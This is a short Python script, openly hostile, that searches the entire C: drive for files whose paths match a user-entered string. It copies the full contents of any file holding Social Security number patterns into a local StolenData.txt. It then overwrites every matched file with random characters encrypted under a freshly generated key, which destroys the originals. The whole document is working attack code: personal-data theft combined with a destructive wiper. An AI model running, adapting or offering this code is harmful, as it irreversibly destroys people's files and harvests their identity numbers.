import os
import re
from random import *
import string
from cryptography.fernet import Fernet
from pathlib import Path
import textwrap

filePaths = []

counter = 0
inp = input("What file shall we attack mi'lord:  ")
thisDir = os.getcwd()
for r, d, f in os.walk("C:\\"):
    for file in f:
        filepath = os.path.join(r, file)
        if not filepath.endswith(".lnk") and inp in filepath:
            counter += 1
            filePaths.append(filepath)

print("There are", counter, "files.")

for file in filePaths:
    print(file, sep='\n')

for x in filePaths:
    file = Path(r'%s' % x)
    with open(file) as F:
        lines = F.readlines()
        if re.search(r'(SSN: ([0-9]{3}-[0-9]{2}-[0-9]{4}|[\w]{5}[0-9]{4}|[\w]{3}\s[\w]{2}\s[0-9]{4}|'
                     r'[\w]{3}-[\w]{2}-[0-9]{4}))', str(lines)):
            with open('StolenData.txt', 'a') as S:
                S.write("\n")
                S.write(str(file) + ":")
                S.write("\n")
                for line in lines:
                    line = line.strip("\n")
                    S.write(str(line))
                    S.write("\n")

for Target in filePaths:
    file = Path(r'%s' % Target)
    with open(file, 'w') as D:
        lower = string.ascii_lowercase
        upper = string.ascii_uppercase
        numbers = string.digits
        symbol = string.punctuation

        combo = lower + upper + numbers + symbol
        filler = "".join(choice(combo) for x in range(1000))
        D.write(re.sub("(.{64})", "\\1\n", filler, 0, re.DOTALL))
        EvilKey = Fernet.generate_key()
        with open('EvilKey.txt', 'wb') as E:
            E.write(EvilKey)

        with open('EvilKey.txt', 'rb') as M:
            dirtyDeeds = M.read()

        Encrypting = Fernet(dirtyDeeds)
        doneDirtCheap = Encrypting.encrypt(bytes(filler, encoding='utf-8'))

        with open(file, 'wb') as Distract:
            Distract.write(bytes(textwrap.fill(str(doneDirtCheap), 64), encoding='utf-8'))
